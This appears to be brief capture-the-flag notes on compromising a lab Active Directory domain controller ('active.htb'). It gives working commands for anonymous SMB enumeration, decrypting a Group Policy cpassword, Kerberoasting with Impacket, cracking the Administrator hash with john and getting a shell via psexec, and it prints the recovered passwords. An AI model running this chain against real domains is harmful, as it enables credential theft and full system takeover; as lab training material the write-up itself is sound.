`rpcclient -U "" active.htb -N` dsnt allow enumeration
`smbclient -N -L \\\\active.htb` 
shows anonymous users can access the Replication share
`smbclient -N \\\\active.htb\Replication`
`RECURSE ON`
`PROMPT OFF`
`mget *`
we find , in Policies dir, groups.xml file, which stores GPO files
name="active.htb\SVC_TGS"
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
`gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`
-> GPPstillStandingStrong2k18

---

Now, we use the creds to perform asrep and kerbroasting
`impacket-GetNPUsers -request active.htb/SVC_TGS -dc-ip 10.129.237.85 -usersfile users.txt -format john -outputfile hashes.txt`
Couldnt get any for asrep

`sudo ntupdate -u active.htb`
`impacket-GetUserSPNs -dc-ip 10.129.237.85 active.htb/SVC_TGS`
We see some entry under administrator user
`impacket-GetUserSPNs -dc-ip 10.129.237.85 active.htb/SVC_TGS -request-user Administrator`
we get the admin hash
put it to a file, hash.txt, john it, and password Ticketmaster1968
`impacket-psexec Administrator@active.htb`
and root!


